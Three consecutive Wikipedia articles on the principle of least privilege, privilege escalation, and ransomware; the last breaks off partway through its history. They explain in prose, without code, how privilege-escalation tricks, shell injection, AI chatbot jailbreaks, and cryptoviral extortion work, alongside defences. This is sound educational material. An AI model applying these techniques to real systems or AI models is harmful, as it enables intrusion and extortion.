Security by granting only essential access


Not to be confused with 
Rule of least power
.


This article 
needs additional citations for 
verification
.
 Please help 
improve this article
 by 
adding citations to reliable sources
. Unsourced material may be challenged and removed.
Find sources:
 
"Principle of least privilege"
 – 
news
 
·
 
newspapers
 
·
 
books
 
·
 
scholar
 
·
 
JSTOR
 
(
April 2019
)
 (
Learn how and when to remove this message
)


In 
information security
, computer science, and other fields, the 
principle of least privilege
 (
PoLP
), also known as the 
principle of minimal privilege
 (
PoMP
) or the 
principle of least authority
 (
PoLA
), requires that in a particular 
abstraction layer
 of a computing environment, every module (such as a process, a user, or a program, depending on the subject) must be able to access only the information and resources that are necessary for its legitimate purpose.
[
1
]






Details
[
edit
]


The principle means giving any users account or processes only those privileges which are essentially vital to perform its intended functions. For example, a user account for the sole purpose of creating backups does not need to install software: hence, it has rights only to run backup and backup-related applications. Any other privileges, such as installing new software, are blocked. The principle applies also to a personal computer user who usually does work in a normal user account, and opens a privileged, password protected account only when the situation absolutely demands it.

When applied to 
users
, the terms 
least user access
 or 
least-privileged user account
 (LUA) are also used, referring to the concept that all user accounts should run with as few 
privileges
 as possible, and also launch applications with as few privileges as possible.

The principle (of least privilege) is widely recognized as an important design consideration towards enhancing and giving a much needed 'Boost' to the protection of data and functionality from faults (
fault tolerance
) and 
malicious behavior
.

Benefits of the principle include:



Intellectual Security. When code is limited in the scope of changes it can make to a system, it is easier to test its possible actions and interactions with other security targeted applications. In practice for example, applications running with restricted rights will not have access to perform operations that could crash a machine, or adversely affect other applications running on the same system.


Better system security. When code is limited in the system-wide actions it may perform, vulnerabilities in one application cannot be used to exploit the rest of the machine. For example, Microsoft states “Running in standard user mode gives customers increased protection against inadvertent system-level damage caused by "
shatter attacks
" and 
malware
, such as 
root kits
, 
spyware
, and undetectable 
viruses
”.
[
2
]


Ease of deployment. In general, the fewer privileges an application requires, the easier it is to deploy within a larger environment. This usually results from the first two benefits, applications that install device drivers or require elevated security privileges typically have additional steps involved in their deployment. For example, on Windows a solution with no 
device drivers
 can be run directly with no installation, while device drivers must be installed separately using the Windows installer service in order to grant the driver elevated privileges.
[
3
]


In practice, there exist multiple competing definitions of true (least privilege). As 
program complexity
 increases rapidly, so do the number of potential issues, rendering a predictive approach impractical. Examples include the values of variables it may process, addresses it will need, or the precise time such things will be required. Object capability systems allow, for instance, deferring granting a single-use privilege until the time when it will be used. Currently, the closest practical approach is to eliminate privileges that can be manually evaluated as unnecessary. The resulting set of privileges typically exceeds the true minimum required privileges for the process.

Another limitation is the granularity of control that the operating environment has over privileges for an individual process.
[
4
]
 In practice, it is rarely possible to control a process's access to memory, processing time, I/O device addresses or modes with the precision needed to facilitate only the precise set of privileges a process will require.

The original formulation is from 
Jerome Saltzer
:
[
5
]




 Every program and every privileged user of the system should operate using the least amount of privilege necessary to complete the job.
— 
Jerome Saltzer
, 
Communications of the ACM


Peter J. Denning
, His paper "Fault Tolerant Operating Systems", set it in a broader perspective among "The four fundamental principles of fault tolerance".

"Dynamic assignments of privileges" was earlier discussed by 
Roger Needham
 in 1972.
[
6
]
[
7
]


Historically, the oldest instance of (least privilege) is probably the source code of 
login.c
, which begins execution with 
super-user
 permissions and—the instant they are no longer necessary—dismisses them via 
setuid()
 with a non-zero argument as demonstrated in the 
Version 6 Unix
 
source code.




Implementation
[
edit
]


The 
kernel
 always runs with maximum privileges since it is the 
operating system
 core and has hardware access. One of the principal responsibilities of an operating system, particularly a multi-user operating system, is management of the hardware's availability and requests to access it from running 
processes
. When the kernel crashes, the mechanisms by which it maintains 
state
 also fail. Therefore, even if there is a way for the 
CPU
 to recover without a 
hard reset
, security continues to be enforced, but the operating system cannot properly respond to the failure because it was not possible to detect the failure. This is because kernel execution either halted or the 
program counter
 resumed execution from somewhere in an endless, and—usually—non-functional 
loop
.
[
citation needed
]
 This would be akin to either experiencing 
amnesia
 (kernel execution failure) or being trapped in a closed maze that always returns to the starting point (closed loops).



The principle of least privilege demonstrated by privilege rings for the 
Intel x86


If execution picks up after the crash by loading and running 
trojan code
, the author of the trojan code can usurp control of all processes. The principle of least privilege forces code to run with the lowest privilege/permission level possible. This means that the code that resumes the code execution-whether trojan or simply code execution picking up from an unexpected location—would not have the ability to perform malicious or undesirable processes. One method used to accomplish this can be implemented in the 
microprocessor
 hardware. For example, in the 
Intel x86
 architecture the manufacturer designed four (ring 0 through ring 3) running "modes" with graduated degrees of access-much like 
security clearance
 systems in defence and intelligence agencies.
[
citation needed
]


As implemented in some operating systems, processes execute with a 
potential privilege set
 and an 
active privilege set
.
[
citation needed
]
 Such privilege sets are inherited from the parent as determined by the semantics of 
fork
()
. An 
executable file
 that performs a privileged function—thereby technically constituting a component of the 
TCB
, and concomitantly termed a trusted program or trusted process—may also be marked with a set of privileges. This is a logical extension of the notions of 
set user ID
 and 
set group ID
.
[
citation needed
]
 The inheritance of 
file privileges
 by a process are determined by the semantics of the 
exec
()
 family of 
system calls
. The precise manner in which potential process privileges, actual process privileges, and file privileges interact can become complex. In practice, least privilege is practiced by forcing a process to run with only those privileges required by the task. Adherence to this model is quite complex as well as error-prone.



Similar principles
[
edit
]


The 
Trusted Computer System Evaluation Criteria
 (TCSEC) concept of 
trusted computing base
 (TCB) minimization is a far more stringent requirement that is only applicable to the functionally strongest assurance classes(Link to Trusted Computer System Evaluation Criteria section Divisions and classes), namely the classes 
B3
 and 
A1
 (which are 
functionally
 identical but differ in terms of evidence and documentation required).

Least privilege is often associated with 
privilege bracketing
: that is, assuming necessary privileges at the last possible moment and dismissing them as soon as no longer strictly necessary, therefore ostensibly reducing fallout from erroneous code that unintentionally exploits more privilege than is merited. Least privilege has also been interpreted in the context of distribution of 
discretionary access control
 (DAC) permissions, for example asserting that giving user U read/write access to file F violates least privilege if U can complete his authorized tasks with only read permission.



See also
[
edit
]


User Account Control


Capability-based security


Compartmentalization (intelligence)


Confused deputy problem


Encapsulation (object-oriented programming)


Need to know


Privilege bracketing


Privilege escalation


Privilege revocation (computing)


Privilege separation


Protection ring


setuid


sudo


References
[
edit
]






^
 
Saltzer, Jerome H.
; 
Schroeder, Michael D.
 (1975). "The protection of information in computer systems". 
Proceedings of the IEEE
. 
63
 (9). Institute of Electrical and Electronics Engineers (IEEE): 1278–1308. 
doi
:
10.1109/proc.1975.9939
. 
ISSN
 
0018-9219
. 
OCLC
 
5871551104
. 
S2CID
 
269166
.




^
 
Jonathan, Clark; DABCC Inc. 
"Virtualization Guru Writes "User-mode is a Good Thing - Deployment to Locked-down Accounts without Security Elevation"
"
. Archived from 
the original
 on 10 February 2013
. Retrieved 
15 Mar
 2013
.




^
 
Aaron Margosis (August 2006). 
"Problems of Privilege: Find and Fix LUA Bugs"
. 
Microsoft
.




^
 
"Matt Bishop, 
Computer Security: Art and Science
, Boston, MA: Addison-Wesley, 2003. pp. 343-344 cited Barnum & Gegick 2005"
. Archived from 
the original
 on 2007-10-20
. Retrieved 
2007-11-17
.




^
 
Saltzer, Jerome H. (1974). "Protection and the control of information sharing in multics". 
Communications of the ACM
. 
17
 (7): 388–402. 
CiteSeerX
 
10.1.1.226.3939
. 
doi
:
10.1145/361011.361067
. 
ISSN
 
0001-0782
. 
S2CID
 
326132
.




^
 
Needham, R. M. (1972). "Protection systems and protection implementations". 
Proceedings of the AFIPS '72 Fall Joint Computer Conference, December 5-7, 1972, Part I
. pp. 571–578. 
doi
:
10.1145/1479992.1480073
. 
S2CID
 
7371342
.




^
 
Fred B. Schneider. 
"Least Privilege and More"
 
(PDF)
.






Bibliography
[
edit
]




Ben Mankin, 
The Formalisation of Protection Systems
, Ph.D. thesis, University of Bath, 2004


P. J. Denning
 (December 1976). "Fault tolerant operating systems". 
ACM Computing Surveys
. 
8
 (4): 359–389. 
doi
:
10.1145/356678.356680
. 
S2CID
 
207736773
.


Jerry H. Saltzer, Mike D. Schroeder (September 1975). 
"The protection of information in computer systems"
. 
Proceedings of the IEEE
. 
63
 (9): 1278–1308. 
CiteSeerX
 
10.1.1.126.9257
. 
doi
:
10.1109/PROC.1975.9939
. 
S2CID
 
269166
.


Deitel, Harvey M. (1990). 
An introduction to operating systems
 (revisited first ed.). Addison-Wesley. p. 
673
. 
ISBN
 
978-0-201-14502-1
.
 page 31.


Sean Martin (April 2012). 
"Are security basics getting lost under the cover of cloud and mobile?"
. 
SC Magazine
.


SANS Institute (May 2013). 
"20 Critical Security Controls"
 
(PDF)
. 
SANS Institute
. Archived from 
the original
 
(PDF)
 on 2013-11-01.




External links
[
edit
]


The Saltzer and Schroeder paper cited in the references.


NSA (the one that implemented SELinux) talks about the principle of least privilege


A discussion of the implementation of the principle of least privilege in Solaris


"Proof that LUA makes you safer" by Dana Epp
 
Archived
 2010-05-23 at the 
Wayback Machine


Applying the Principle of Least Privilege to User Accounts on Windows XP, by Microsoft


"Commercial enterprises are putting our critical infrastructure at risk" CSO


How to successfully implement the principle of least privilege


v
t
e
Object-capability
 security
Concepts


Principle of least privilege
 (PoLP)


Confused deputy problem


Ambient authority


File descriptor


C-list


Object-capability model


Capability-based security


Capability-based addressing


Zooko's triangle


Petnames


Operating systems
, 
kernels


Capsicum


Fuchsia


Genode


GNOSIS
 → 
KeyKOS
 → 
EROS
 → 
CapROS


Hydra


iMAX 432


Midori


NLTSS


seL4


HarmonyOS
 (
HarmonyOS NEXT
)


Phantom OS


Programming languages


Cajita


E


Joe-E


Joule


File systems


Tahoe-LAFS


Specialised hardware


BiiN


Cambridge CAP


Flex


IBM System/38


Intel iAPX 432


Plessey System 250












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Principle_of_least_privilege&oldid=1245646690
"


Categories
: 
Information theory
Computer security
Hidden categories: 
Articles with short description
Short description is different from Wikidata
Articles needing additional references from April 2019
All articles needing additional references
All articles with unsourced statements
Articles with unsourced statements from April 2019
Webarchive template wayback links











From Wikipedia, the free encyclopedia






Gaining control of computer privileges beyond what is normally granted


A diagram describing privilege escalation.  The arrow represents a 
rootkit
 gaining access to the kernel, and the little gate represents normal privilege elevation, where the user has to enter an Administrator username and password.


Privilege escalation
 is the act of exploiting a 
bug
, a 
design flaw
, or a configuration oversight in an 
operating system
 or 
software application
 to gain elevated access to 
resources
 that are normally protected from an application or 
user
. The result is that an application or user with more 
privileges
 than intended by the 
application developer
 or 
system administrator
 can perform 
unauthorized
 actions.





Background
[
edit
]


Most computer systems are designed for use with multiple user accounts, each of which has abilities known as 
privileges
. Common privileges include viewing and editing files or modifying system files.

Privilege escalation means users receive privileges they are not entitled to. These privileges can be used to delete files, view 
private information
, or install unwanted programs such as viruses. It usually occurs when a system has a 
bug
 that allows security to be bypassed or, alternatively, has flawed design assumptions about how it will be used.  Privilege escalation occurs in two forms:



Vertical privilege escalation
, also known as 
privilege elevation
, where a lower privilege user or application accesses functions or content reserved for higher privilege users or applications (e.g. Internet Banking users can access site administrative functions or the password for a smartphone can be bypassed.)


Horizontal privilege escalation
, where a normal user accesses functions or content reserved for other normal users (e.g. Internet Banking User A accesses the Internet bank account of User B)


Vertical
[
edit
]


Privilege rings for the 
x86
 available in 
protected mode


This type of 
privilege
 escalation occurs when the user or process is able to obtain a higher level of access than an administrator or system developer intended, possibly by performing 
kernel-level
 operations.



Examples
[
edit
]


In some cases, a high-privilege application assumes that it would only be provided with input matching its interface specification, thus doesn't validate this input. Then, an attacker may be able to exploit this assumption, in order to run unauthorized code with the application's privileges:



Some 
Windows services
 are configured to run under the Local System user account. A vulnerability such as a 
buffer overflow
 may be used to execute arbitrary code with privilege elevated to Local System.  Alternatively, a system service that is impersonating a lesser user can elevate that user's privileges if errors are not handled correctly while the user is being impersonated (e.g. if the user has introduced a malicious 
error handler
)


Under some legacy versions of the 
Microsoft Windows
 operating system, the All Users 
screensaver
 runs under the Local System account – any account that can replace the current screensaver 
binary
 in the file system or 
Registry
 can therefore elevate privileges.


In certain versions of the 
Linux kernel
 it was possible to write a program that would set its current directory to 
/etc/cron.d
, request that a 
core dump
 be performed in case it crashes and then have itself 
killed
 by another process. The core dump file would have been placed at the program's current directory, that is, 
/etc/cron.d
, and 
cron
 would have treated it as a text file instructing it to run programs on schedule. Because the contents of the file would be under attacker's control, the attacker would be able to execute any program with 
root
 privileges.


Cross Zone Scripting
 is a type of privilege escalation attack in which a website subverts the security model of web browsers, thus allowing it to run malicious code on client computers.


There are also situations where an application can use other high privilege services and has incorrect assumptions about how a client could manipulate its use of these services. An application that can execute 
Command line
 or 
shell
 commands could have a 
Shell Injection
 vulnerability if it uses unvalidated input as part of an executed command.  An attacker would then be able to run system commands using the application's privileges.


Texas Instruments
 calculators (particularly the 
TI-85
 and 
TI-82
) were originally designed to use only interpreted programs written in dialects of 
TI-BASIC
; however, after users discovered bugs that could be exploited to allow native 
Z-80
 code to run on the calculator hardware, TI released programming data to support third-party development. (This did not carry on to the 
ARM
-based 
TI-Nspire
, for which jailbreaks using 
Ndless
 have been found but are still actively fought against by Texas Instruments.)


Some versions of the 
iPhone
 allow an unauthorised user to access the phone while it is locked.
[
1
]


Jailbreaking
[
edit
]


For jailbreaking iOS systems, see 
iOS jailbreaking
.


In computer security, 
jailbreaking
 is defined as the act of removing limitations that a vendor attempted to hard-code into its software or services.
[
2
]
 A common example is the use of toolsets to break out of a 
chroot
 or 
jail
 in 
UNIX-like
 operating systems
[
3
]
 or bypassing 
digital rights management
 (DRM). In the former case, it allows the user to see files outside of the 
filesystem
 that the administrator intends to make available to the application or user in question. In the context of DRM, this allows the user to run arbitrarily defined code on devices with DRM as well as break out of chroot-like restrictions. The term originated with the 
iPhone
/
iOS
 jailbreaking community and has also been used as a term for 
PlayStation Portable
 hacking; these devices have repeatedly been subject to jailbreaks, allowing the execution of arbitrary code, and sometimes have had those jailbreaks disabled by vendor updates.

iOS
 systems including the 
iPhone
, 
iPad
, and 
iPod Touch
 have been subject to 
iOS jailbreaking
 efforts since they were released, and continuing with each firmware update.
[
4
]
[
5
]
 iOS jailbreaking tools include the option to install package frontends such as 
Cydia
 and 
Installer.app
, third-party alternatives to the 
App Store
, as a way to find and install system tweaks and binaries. To prevent iOS jailbreaking, Apple has made the device 
boot ROM
 execute checks for 
SHSH blobs
 in order to disallow uploads of custom kernels and prevent software downgrades to earlier, jailbreakable firmware. In an "untethered" jailbreak, the iBoot environment is changed to execute a boot ROM exploit and allow submission of a patched low level bootloader or hack the kernel to submit the jailbroken kernel after the SHSH check.

A similar method of jailbreaking exists for 
S60 Platform
 
smartphones
, where utilities such as HelloOX allow the execution of unsigned code and full access to system files.
[
6
]
[
7
]
 or edited firmware (similar to the M33 hacked firmware used for the 
PlayStation Portable
)
[
8
]
 to circumvent restrictions on 
unsigned code
. 
Nokia
 has since issued updates to curb unauthorized jailbreaking, in a manner similar to Apple.

In the case of gaming consoles, jailbreaking is often used to execute 
homebrew games
. In 2011, 
Sony
, with assistance from law firm 
Kilpatrick Stockton
, sued 21-year-old 
George Hotz
 and associates of the group fail0verflow for jailbreaking the 
PlayStation 3
 (see 
Sony Computer Entertainment America v. George Hotz
 and 
PlayStation Jailbreak
).

Jailbreaking can also occur in systems and software that use generative artificial intelligence models, such as 
ChatGPT
. In jailbreaking attacks on 
artificial intelligence
 systems, users are able to manipulate the model to behave differently than it was programmed, making it possible to reveal information about how the model was instructed and induce it to respond in an anomalous or harmful way.
[
9
]
[
10
]




Android
[
edit
]


Main article: 
Rooting (Android)


Android phones can be officially rooted by either going through manufacturers controlled process, using an exploit to gain root, or flashing custom recovery. Manufacturers allow rooting through a process they control, while some allow the phone to be rooted simply by pressing specific key combinations at boot time, or by other self-administered methods. Using a manufacturers method almost always factory resets the device, making rooting useless to people who want to view the data, and also voids the warranty permanently, even if the device is derooted and reflashed. Software exploits commonly either target a root-level process that is accessible to the user, by using an exploit specific to the phone's kernel, or using a known Android exploit that has been patched in newer versions; by not upgrading the phone, or intentionally downgrading the version.



Mitigation strategies
[
edit
]


Operating systems and users can use the following strategies to reduce the risk of privilege escalation:



Data Execution Prevention


Address space layout randomization
 (to make it harder for 
buffer overruns
 to execute privileged instructions at known addresses in memory)


Running applications with 
least privilege
 (for example by running 
Internet Explorer
 with the Administrator 
SID
 disabled in the process 
token
) in order to reduce the ability of buffer overrun 
exploits
 to abuse the privileges of an elevated user.


Requiring kernel mode code to be digitally signed.


Patching


Use of 
compilers
 that trap buffer overruns
[
11
]


Encryption of software and/or 
firmware
 components.


Use of an operating system with Mandatory Access Controls (MAC) such as 
SELinux
[
12
]


Kernel Data Relocation Mechanism (dynamically relocates privilege information in the running kernel, preventing privilege escalation attacks using memory corruption)


Recent research has shown what can effectively provide protection against privilege escalation attacks. These include the proposal of the additional kernel observer (AKO), which specifically prevents attacks focused on OS vulnerabilities. Research shows that AKO is in fact effective against privilege escalation attacks.
[
13
]




Horizontal
[
edit
]


Horizontal privilege escalation occurs when an application allows the attacker to gain access to 
resources
 which normally would have been protected from an application or 
user
. The result is that the application performs actions with the same user but different security context than intended by the 
application developer
 or 
system administrator
; this is effectively a limited form of privilege escalation (specifically, the unauthorized assumption of the capability of impersonating other users). Compared to the vertical privilege escalation, horizontal requires no upgrading the privilege of accounts. It often relies on the bugs in the system.
[
14
]




Examples
[
edit
]


This problem often occurs in 
web applications
.  Consider the following example:



User A has access to their own bank account in an Internet Banking application.


User B has access to their own bank account in the same Internet Banking application.


The vulnerability occurs when User A is able to access User B's bank account by performing some sort of malicious activity.


This malicious activity may be possible due to common web application weaknesses or vulnerabilities.

Potential web application vulnerabilities or situations that may lead to this condition include:



Predictable 
session IDs
 in the user's 
HTTP cookie


Session fixation


Cross-site scripting


Easily guessable 
passwords


Theft or hijacking of 
session cookies


Keystroke logging


See also
[
edit
]


Cybersecurity


Defensive programming


Hacking of consumer electronics


Illegal number


Principle of least privilege


Privilege revocation (computing)


Privilege separation


Rooting (Android OS)


Row hammer


References
[
edit
]






^
 
Taimur Asad (October 27, 2010). 
"Apple Acknowledges iOS 4.1 Security Flaw. Will Fix it in November with iOS 4.2"
. RedmondPie. 
Archived
 from the original on February 18, 2013
. Retrieved 
November 5,
 2010
.




^
 
"Definition of JAILBREAK"
. 
www.merriam-webster.com
. 
Archived
 from the original on 24 December 2022
. Retrieved 
24 December
 2022
.




^
 
Cyrus Peikari; Anton Chuvakin (2004). 
Security Warrior: Know Your Enemy
. "O'Reilly Media, Inc.". p. 
304
. 
ISBN
 
978-0-596-55239-8
.




^
 
James Quintana Pearce (2007-09-27), 
Apple's Disagreement With Orange, IPhone Hackers
, paidContent.org, archived from 
the original
 on 2012-07-29
, retrieved 
2011-11-25




^
 
"Reports: Next iPhone update will break third-party apps, bust unlocks]"
. 
Computerworld
 on v1.1.3
. Archived from 
the original
 on 2008-01-04
. Retrieved 
2008-01-01
.




^
 
Phat^Trance (Feb 16, 2010). 
"Announcement: Forum down for maintaining"
. 
dailymobile.se
. Archived from 
the original
 on March 3, 2009
. Retrieved 
August 30,
 2016
. 
Just wanted to let you guys know that the forum is down for maintaining. It will be back online in a day or so (i kinda messed up the config files and need to restore one day old backup, so i thought why not update the entire server platform)




^
 
"HelloOX 1.03: one step hack for Symbian S60 3rd ed. phones, and for Nokia 5800 XpressMusic too"
. 
Archived
 from the original on 2020-08-07
. Retrieved 
2009-07-06
.




^
 
"Bypass Symbian Signed & Install UnSigned SISX/J2ME Midlets on Nokia S60 v3 with Full System Permissions"
. 
Archived
 from the original on 2016-09-11
. Retrieved 
2009-07-06
.




^
 
"What is Jailbreaking in A.I. models like ChatGPT?"
. 
Archived
 from the original on 2023-12-01
. Retrieved 
2023-11-01
.




^
 
"ChatGPT's 'jailbreak' tries to make the A.I. break its own rules, or die"
. 
Archived
 from the original on 2023-03-02
. Retrieved 
2023-11-01
.




^
 
"Microsoft Minimizes Threat of Buffer Overruns, Builds Trustworthy Applications"
. 
Microsoft
. September 2005
. Retrieved 
2008-08-04
.
 
[
dead link
]




^
 
Smalley, Stephen. 
"Laying a Secure Foundation for Mobile Devices"
 
(PDF)
. Archived from 
the original
 
(PDF)
 on 28 August 2017
. Retrieved 
7 March
 2014
.




^
 
Yamauchi, Toshihiro; Akao, Yohei; Yoshitani, Ryota; Nakamura, Yuichi; Hashimoto, Masaki (August 2021). 
"Additional kernel observer: privilege escalation attack prevention mechanism focusing on system call privilege changes"
. 
International Journal of Information Security
. 
20
 (4): 461–473. 
doi
:
10.1007/s10207-020-00514-7
. 
ISSN
 
1615-5262
. 
Archived
 from the original on 2024-05-24
. Retrieved 
2023-11-10
.




^
 
Diogenes, Yuri (2019). 
Cybersecurity - Attack and Defense Strategies - Second Edition
. Erdal Ozkaya, Safari Books Online (2nd ed.). p. 304. 
ISBN
 
978-1-83882-779-3
. 
OCLC
 
1139764053
. 
Archived
 from the original on 2024-05-24
. Retrieved 
2022-08-13
.






v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Privilege_escalation&oldid=1233954694
"


Categories
: 
Operating system security
Privilege escalation exploits
Hidden categories: 
All articles with dead external links
Articles with dead external links from September 2010
Articles with short description
Short description is different from Wikidata













From Wikipedia, the free encyclopedia






Malicious software used in ransom demands




Ransomware
 is a type of 
malware
 that permanently blocks access to the victim's 
personal data
 unless a "ransom" is paid. While some simple ransomware may lock the system without damaging any files, more advanced malware uses a technique called cryptoviral extortion. It 
encrypts
 the victim's files, making them inaccessible, and demands a ransom payment to decrypt them.
[
1
]
[
2
]
[
3
]
[
4
]
[
5
]
 In a properly implemented cryptoviral extortion attack, recovering the files without the decryption 
key
 is an 
intractable
 problem, and difficult-to-trace 
digital currencies
 such as 
paysafecard
 or 
Bitcoin
 and other 
cryptocurrencies
 are used for the ransoms, making tracing and prosecuting the perpetrators difficult.

Ransomware attacks are typically carried out using a 
Trojan
 disguised as a legitimate file that the user is tricked into downloading or opening when it arrives as an email attachment. However, one high-profile example, the 
WannaCry worm
, traveled automatically between computers without user interaction.
[
6
]


Starting as early as 1989 with the first documented ransomware known as the 
AIDS trojan
, the use of ransomware scams has grown internationally.
[
7
]
[
8
]
[
9
]
 There were 181.5 million ransomware attacks in the first six months of 2018. This record marks a 229% increase over this same time frame in 2017.
[
10
]
 In June 2014, vendor 
McAfee
 released data showing that it had collected more than double the number of ransomware samples that quarter than it had in the same quarter the previous year.
[
11
]
 
CryptoLocker
 was particularly successful, procuring an estimated US$3 million before it was taken down by authorities,
[
12
]
 and CryptoWall was estimated by the US 
Federal Bureau of Investigation
 (FBI) to have accrued over US$18 million by June 2015.
[
13
]
 In 2020, the IC3 received 2,474 complaints identified as ransomware with adjusted losses of over $29.1 million. The losses could be more than that, according to the FBI.
[
14
]
 Globally, according to 
Statistica
, there were about 623 million ransomware attacks in 2021, and 493 million in 2022.
[
15
]






Operation
[
edit
]


The concept of file-encrypting ransomware was invented and implemented by Young and 
Yung
 at 
Columbia University
 and was presented at the 1996 IEEE Security & Privacy conference. It is called 
cryptoviral extortion
 and it was inspired by the fictional facehugger in the movie 
Alien
.
[
16
]
 Cryptoviral extortion is the following three-round protocol carried out between the attacker and the victim.
[
1
]




[attacker→victim] The attacker generates a key pair and places the corresponding public key in the malware. The malware is released.


[victim→attacker] To carry out the cryptoviral extortion attack, the malware generates a random 
symmetric key
 and encrypts the victim's data with it. It uses the public key in the malware to encrypt the symmetric key. This is known as 
hybrid encryption
 and it results in a small asymmetric ciphertext as well as the symmetric ciphertext of the victim's data. It 
zeroizes
 the symmetric key and the original plaintext data to prevent recovery. It puts up a message to the user that includes the asymmetric ciphertext and how to pay the ransom. The victim sends the asymmetric ciphertext and e-money to the attacker.


[attacker→victim] The attacker receives the payment, deciphers the asymmetric ciphertext with the attacker's private key, and sends the symmetric key to the victim. The victim deciphers the encrypted data with the needed symmetric key thereby completing the cryptovirology attack.


The 
symmetric key
 is randomly generated and will not assist other victims. At no point is the attacker's private key exposed to victims and the victim need only send a very small ciphertext (the encrypted symmetric-cipher key) to the attacker.

Ransomware attacks are typically carried out using a 
Trojan
, entering a system through, for example, a malicious attachment, embedded link in a 
phishing
 email, or a vulnerability in a network service. The program then runs a 
payload
, which locks the system in some fashion, or claims to lock the system but does not (e.g., a 
scareware
 program). Payloads may display a fake warning purportedly by an entity such as a 
law enforcement agency
, falsely claiming that the system has been used for illegal activities, contains content such as 
pornography
 and 
"pirated" media
.
[
17
]
[
18
]
[
19
]


Some payloads consist simply of an application designed to lock or restrict the system until payment is made, typically by setting the 
Windows Shell
 to itself,
[
20
]
 or even modifying the 
master boot record
 and/or 
partition table
 to prevent the operating system from booting until it is repaired.
[
21
]
 The most sophisticated payloads 
encrypt
 files, with many using 
strong encryption
 to 
encrypt
 the victim's files in such a way that only the malware author has the needed decryption key.
[
1
]
[
22
]
[
23
]


Payment is virtually always the goal, and the victim is 
coerced
 into paying for the ransomware to be removed either by supplying a program that can decrypt the files, or by sending an unlock code that undoes the payload's changes. While the attacker may simply take the money without returning the victim's files, it is in the attacker's best interest to perform the decryption as agreed, since victims will stop sending payments if it becomes known that they serve no purpose. A key element in making ransomware work for the attacker is a convenient payment system that is hard to trace. A range of such payment methods have been used, including 
wire transfers
, 
premium-rate text messages
,
[
24
]
 pre-paid 
voucher
 services such as 
paysafecard
,
[
7
]
[
25
]
[
26
]
 and the 
Bitcoin
 
cryptocurrency
.
[
27
]
[
28
]
[
29
]


In May 2020, vendor Sophos reported that the global average cost to remediate a ransomware attack (considering downtime, people time, device cost, network cost, lost opportunity and ransom paid) was $761,106. Ninety-five percent of organizations that paid the ransom had their data restored.
[
30
]




History
[
edit
]


See also: 
History of computer viruses
 and 
History of malware


Encrypting ransomware
[
edit
]


The first known malware extortion attack, the 
"AIDS Trojan"
 written by Joseph Popp in 1989, had a design failure so severe it was not necessary to pay the extortionist at all. Its payload hid the files on the hard drive and encrypted only their 
names
, and displayed a message claiming that the user's license to use a certain piece of software had expired. The user was asked to pay 
US$
189 to "PC Cyborg Corporation" in order to obtain a repair tool even though the decryption key could be extracted from the code of the Trojan. The Trojan was also known as "PC Cyborg". Popp was declared 
mentally unfit
 to stand trial for his actions, but he promised to donate the profits from the malware to fund 
AIDS
 research.
[
31
]


The idea of abusing anonymous cash systems to safely collect ransom from human 
kidnapping
 was introduced in 1992 by Sebastiaan von Solms and 
David Naccache
.
[
32
]
 This electronic money collection method was also proposed for cryptoviral extortion attacks.
[
1
]
 In the von Solms-Naccache scenario a newspaper publication was used (since bitcoin ledgers did not exist at the time the paper was written).

The notion of using public key cryptography for data kidnapping attacks was introduced in 1996 by Adam L. Young and 
Moti Yung
. Young and Yung critiqued the failed AIDS Information Trojan that relied on 
symmetric cryptography
 alone, the fatal flaw being that the decryption key could be extracted from the Trojan, and implemented an experimental proof-of-concept cryptovirus on a 
Macintosh SE/30
 that used 
RSA
 and the 
Tiny Encryption Algorithm
 (TEA) to 
hybrid encrypt
 the victim's data. Since 
public key cryptography
 is used, the virus only contains the 
encryption
 key. The attacker keeps the corresponding 
private
 decryption key private. Young and Yung's original experimental cryptovirus had the victim send the asymmetric ciphertext to the attacker who deciphers it and returns the symmetric decryption key it contains to the victim for a fee. Long before 
electronic money
 existed Young and Yung proposed that electronic money could be extorted through encryption as well, stating that "the virus writer can effectively hold all of the money ransom until half of it is given to him. Even if the e-money was previously encrypted by the user, it is of no use to the user if it gets encrypted by a cryptovirus".
[
1
]
 They referred to these attacks as being "
cryptoviral
 extortion", an overt attack that is part of a larger class of attacks in a field called 
cryptovirology
, which encompasses both overt and covert attacks.
[
1
]
 The cryptoviral extortion protocol was inspired by the parasitic relationship between H. R. Giger's facehugger and its host in the movie 
Alien
.
[
1
]
[
16
]


Examples of extortionate ransomware became prominent in May 2005.
[
33
]
 By mid-2006, Trojans such as 
Gpcode
, TROJ.RANSOM.A, 
Archiveus
, Krotten, Cryzip, and MayArchive began utilizing more sophisticated RSA encryption schemes, with ever-increasing key-sizes. Gpcode.AG, which was detected in June 2006, was encrypted with a 660-bit RSA public key.
[
34
]
 In June 2008, a variant known as Gpcode.AK was detected. Using a 1024-bit RSA key, it was believed large enough to be computationally infeasible to break without a concerted 
distributed
 effort.
[
35
]
[
36
]
[
37
]
[
38
]


Encrypting ransomware returned to prominence in late 2013 with the propagation of 
CryptoLocker
—using the 
Bitcoin
 
digital currency
 platform to collect ransom money. In December 2013, 
ZDNet
 estimated based on Bitcoin transaction information that between 15 October and 18 December, the operators of CryptoLocker had procured about US$27 million from infected users.
[
39
]
 The CryptoLocker technique was 
widely copied
